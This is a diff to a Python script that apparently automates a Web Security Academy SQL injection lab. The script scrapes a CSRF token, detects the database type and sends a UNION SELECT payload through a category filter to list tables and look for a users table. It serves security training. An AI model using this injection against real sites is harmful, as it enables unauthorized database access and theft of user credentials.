@@ -9,7 +9,6 @@ lab = parser.parse_args()
 
 COLUMNS = 0
 mysql = 0
-postgresql = 0
 r = requests.get("https://" + lab.id + f".web-security-academy.net/login")
 csrf = re.search(r'<input[^>]+name=["\']csrf["\'][^>]+value=["\'](.*?)["\']', r.text).group(1)
 headers = { 'Cookie': f'session={r.cookies.get("session")}' }
@@ -29,13 +28,10 @@ try:
     if r:
         print("Database is MySQL or Microsoft.")
         mysql = 1
-    else:
-        print("Database is PostgreSQL.")
-        postgresql = 1
 except:
-    print("Error while trying to determine database type.")
+    print("Error while trying to determine if database type is MySQL or Microsoft. It may be PostgreSQL.")
 
-if mysql or postgresql:
+if mysql:
     
     # RETRIEVE ALL TABLES AND SEARCH FOR USERS TABLE
     r = requests.get("https://" + lab.id + f".web-security-academy.net/filter?category='UNION SELECT {'NULL,'*(COLUMNS-1)}table_name FROM information_schema.tables-- ")
